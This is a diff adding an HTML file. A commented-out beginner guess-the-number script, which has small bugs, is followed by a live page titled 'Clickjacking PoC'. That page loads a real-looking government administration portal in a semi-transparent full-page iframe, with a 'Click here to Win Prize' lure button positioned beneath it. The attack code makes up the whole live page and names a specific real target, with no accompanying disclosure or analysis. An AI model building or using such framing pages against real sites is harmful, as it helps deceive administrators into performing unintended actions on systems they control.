@@ -1,0 +1,40 @@
+<!-- <h1>Guess The Number</h1>
+<input id="inputbox">
+<button onclick="check()">Check!</button>
+<p id="resultstatus">You Are Wrong/Right</p>
+<p id="Score">Score:</p>
+<script>
+    //selecting input box , para tags
+    var GuessNumber = document.getElementById("inputbox")
+    var result = document.getElementById("resultstatus")
+    var randomNumber = Math.floor(Math.random()*10)+1
+    var score=document.getElementById("score")
+    var totalScore = 10
+    function check()
+    {
+        var enteredNumber = GuessNumber.Value
+         if(randomNumber == enteredNumber){
+            console.log("Right")
+            resultstatus.textContent="Right"
+            alert("YOU WON....🎉")
+
+         }
+         else{
+            totalScore=totalScore-1
+            console.log("WRONG")
+            resultstatus.textContent = "Wrong"
+            Score.textContent ="Score:" + totalScore
+         }
+    }
+</script> -->
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Clickjacking PoC</title>
+</head>
+<body>
+<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
+<iframe src="https://admin.tnhb.tn.gov.in/" width=100% height=100% style="opacity: 0.5;"></iframe>
+</body>
+</html>
